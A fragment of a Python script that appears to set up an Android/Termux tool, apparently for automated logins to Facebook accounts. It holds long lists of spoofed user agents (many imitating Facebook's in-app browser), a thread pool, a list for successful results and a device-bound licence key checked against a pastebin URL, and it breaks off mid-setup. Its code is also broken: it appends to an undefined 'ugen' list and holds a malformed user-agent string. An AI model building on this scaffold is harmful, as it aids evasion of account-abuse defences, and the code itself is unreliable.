

#----------------------------[IMPORT/MODULE]-----------------------------------#
import os
import random
import sys
import subprocess
import time
import pycurl
from io import BytesIO

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")

try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")

from concurrent.futures import ThreadPoolExecutor as ThreadPool

#-----------------------------user agent-------------------------------#
a="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
b="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko"
c="Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30"
d="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
e="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
f="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
g="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
i="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
j="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
l="Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
m="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
n="Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
o="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
p="Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0"
q="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
r="Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)"
s="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7"
t="Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
u="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
v="Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
w="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
x="Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
y="Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
z="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
aa="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
bb="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
cc="Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
dd="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
ee="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0E; InfoPath.1)"
ff="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
gg="Mozilla/5.0 (compatible; ecoresearch/0.9; +http://www.ecoresearch.net)"
hh="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
ii="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
jj="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
kk="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
ll="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
mm="Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/FBIOS;FBAV/78.0.0.40.70;FBBV/48784289;FBRV/0;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/OrangeFrance;FBID/phone;FBLC/fr_FR;FBOP/5]"
nn="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
oo="Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0"
pp="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
qq="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
rr="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 Iceweasel/3.0.3 (Debian-3.0.3-3)"
ss="Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
tt="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
ww="Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
xx="Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.8) Gecko/20051128 SUSE/1.5-0.1 Firefox/1.5.0.1"
yy="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0"
zz="Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]"
ab="Mozilla/5.0 (Linux; Android 5; en-us; DROID4 4G Build/6.7.2-180_DR4-16_M2-37) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.4529.141 Mobile Safari/537.36"
vv="Mozilla/5.0 (Linux; Android {10}; SM-A305GN Build/PPR1.247706.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6265.94 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/337.1.0.11.118;]"
zxx=(ab,vv,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv,ww,xx,yy,zz)
ugen.append(zxx)
akx="Mozilla/5.0 (Linux; arm_64; Android 12; CPH2159) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.7.38.00 SA/3 Mobile Safari/537.36"
akx1="Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648"
akx2="Mozilla/5.0 (Linux; Android 8.1.0; ZB602KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"
akx3="Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648"
akx4="Mozilla/5.0 (Linux; Android 10; A7 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648"
akx5="Mozilla/5.0 (Linux; Android 11; CPH2145) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
akx6="Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648"
akx7="Mozilla/5.0 (Linux; Android 13; SM-F700F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 Replaio/3.1.2"
akx8="Mozilla/5.0 (Linux; arm_64; Android 11; RMX3430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.16.1 YaSearchBrowser/23.16.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
akx9="Mozilla/5.0 (Linux; U; Android 13; ru-ru; Xiaomi 12 Lite Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.24.1-gn"
akx0="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/32.0.875.0 Safari/532.0.0"
akx10="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_7) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/29.0.847.0 Safari/531.0.0"
akx11="Mozilla/5.0 (Windows NT 5.2; WOW64; rv:8.4) Gecko/20100101 Firefox/8.4.2"
akx12="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/30.0.895.0 Safari/537.0.2"
akx13="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1 rv:4.0; LT) AppleWebKit/533.0.2 (KHTML, like Gecko) Version/6.1.0 Safari/533.0.2"
akx14="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.9; rv:10.8) Gecko/20100101 Firefox/10.8.8"
akx15="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4 rv:4.0; AB) AppleWebKit/532.1.2 (KHTML, like Gecko) Version/5.1.1 Safari/532.1.2"
akx16="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/24.0.891.0 Safari/532.0.1"
akx17="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.1; .NET CLR 4.4.84894.6)"
akx18="Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/38.0.838.0 Safari/532.0.1"
akx19="Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/7.0; .NET CLR 4.1.89512.2)"
akx20="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/26.0.849.0 Safari/538.2.0"
akx21="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0 rv:4.0; MG) AppleWebKit/536.1.0 (KHTML, like Gecko) Version/5.1.10 Safari/536.1.0"
akx22="Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/13.0.850.0 Safari/533.1.0"
akx23="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.1; .NET CLR 4.5.92358.2)"
akx24="Mozilla/5.0 (Windows NT 6.2; WOW64; rv:6.4) Gecko/20100101 Firefox/6.4.2"
akx25="Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:6.3) Gecko/20100101 Firefox/6.3.7"
akx26="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.0; .NET CLR 1.2.74030.3)"
akx27="Mozilla/5.0 (Windows NT 5.2; rv:14.0) Gecko/20100101 Firefox/14.0.9"
akx28="Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/17.0.817.0 Safari/532.1.2"
akx29="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/28.0.840.0 Safari/533.0.0"
akx30="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/38.0.862.0 Safari/536.1.2"
akx31="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/39.0.875.0 Safari/532.2.0"
akx32="Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/13.0.849.0 Safari/537.0.2"
akx33="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7 rv:6.0; JV) AppleWebKit/534.0.2 (KHTML, like Gecko) Version/4.0.10 Safari/534.0.2"
akx34="Opera/12.32 (Windows NT 5.1; U; CE Presto/2.9.167 Version/11.00)"
akx35="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/34.0.852.0 Safari/534.0.1"
akx36="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9 rv:2.0; SC) AppleWebKit/538.1.1 (KHTML, like Gecko) Version/6.0.2 Safari/538.1.1"
akx37="Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/29.0.861.0 Safari/537.1.0"
akx38="Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.1; .NET CLR 3.7.27846.5)"
akx39="Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5 Plus MIUI/V10.2.1.0.OEGMIXM)"
akx40="Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A600F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
akx41="Mozilla/5.0 (Linux; Android 9; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
akx42="Mozilla/5.0 (Linux; Android 9; SM-A705GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
akx43="Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/68.0.234683655 Mobile/14G60 Safari/602.1"
akx44="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
akx45="Mozilla/5.0 (Linux; Android 5.1.1; SM-J105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/5.10.32.19.arm"
akx46="Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5A MIUI/V10.3.2.0.OCKMIXM)"
akx47="Mozilla/5.0 (Linux; Android 6.0; SMART Surf2 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
akx48="Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"
akx49="Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/71.0.3578.89 Mobile/14E304 Safari/602.1"
akx50="Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"
akx51="Mozilla/5.0 (Linux; Android 4.1.2; C1905 Build/15.1.C.2.8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
akx52="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; IEeleven; rv:11.0) like Gecko"
akx53="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36 OPR/62.0.3331.18"
akx54="Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 GSA/10.28.9.21.arm64"
akx55="Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"
akx56="Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36"
akx57="AndroidDownloadManager/8.1.0 (Linux; U; Android 8.1.0; meizu X8 Build/OPM1.171019.026)"
akx58="Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"
akx59="Mozilla/5.0 (Linux; Android 9; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
akx60="Mozilla/5.0 (Linux; Android 7.1.1; VFD 710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
akx61="Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36"
akx62="Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
akx63="AndroidDownloadManager/9 (Linux; U; Android 9; SM-A705FN Build/PPR1.180610.011)"
akx64="Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415F Build/M1AJQ)"
akx65="Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G935A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"
akx66="Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.20.3.21.arm"
akx67="AndroidDownloadManager/9 (Linux; U; Android 9; VTR-L09 Build/HUAWEIVTR-L09)"
akx68="Dalvik/2.1.0 (Linux; U; Android 9; VTR-L09 Build/HUAWEIVTR-L09)"
cxk=(akx,akx0,akx1,akx2,akx3,akx4,akx5,akx6,akx7,akx8,akx9,akx10,akx11,akx12,akx13,akx14,akx15,akx16,akx17,akx18,akx19,akx20,akx21,akx22,akx23,akx24,akx25,akx26,akx27,akx28,akx29,akx30,akx31,akx32,akx33,akx34,akx35,akx36,akx37,akx38,akx39,akx40,akx41,akx42,akx43,akx44,akx45,akx46,akx47,akx48,akx49,akx50,akx51,akx52,akx53,akx54,akx55,akx56,akx57,akx58,akx59,akx60,akx61,akx62,akx63,akx64,akx65,akx66,akx67,akx68)
ugen.append(cxk)
a="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
b="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko"
c="Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30"
d="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
e="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
f="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
g="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
i="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
j="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
l="Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
m="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
n="Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
o="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
p="Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0"
q="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
r="Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)"
s="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7"
t="Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
u="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
v="Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
w="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
x="Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
y="Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
z="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
aa="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
bb="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
cc="Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
dd="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
ee="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0E; InfoPath.1)"
ff="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
gg="Mozilla/5.0 (compatible; ecoresearch/0.9; +http://www.ecoresearch.net)"
hh="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
ii="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
jj="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
kk="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
ll="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
mm="Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/FBIOS;FBAV/78.0.0.40.70;FBBV/48784289;FBRV/0;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/OrangeFrance;FBID/phone;FBLC/fr_FR;FBOP/5]"
nn="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
oo="Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0"
pp="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
qq="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
rr="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 Iceweasel/3.0.3 (Debian-3.0.3-3)"
ss="Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
tt="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []
#-----------------------------[APPROVAL KEY]-----------------------------------#
a = str(os.geteuid())
b = str(os.geteuid())
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
x = (a+build+b).upper().replace(".","")
z = "X".join(x)
keys = z[15:]

appx_buffer = BytesIO()
appx_curl = pycurl.Curl()
appx_curl.setopt(pycurl.URL, "https://pastebin.com/raw/DcfTisKU")
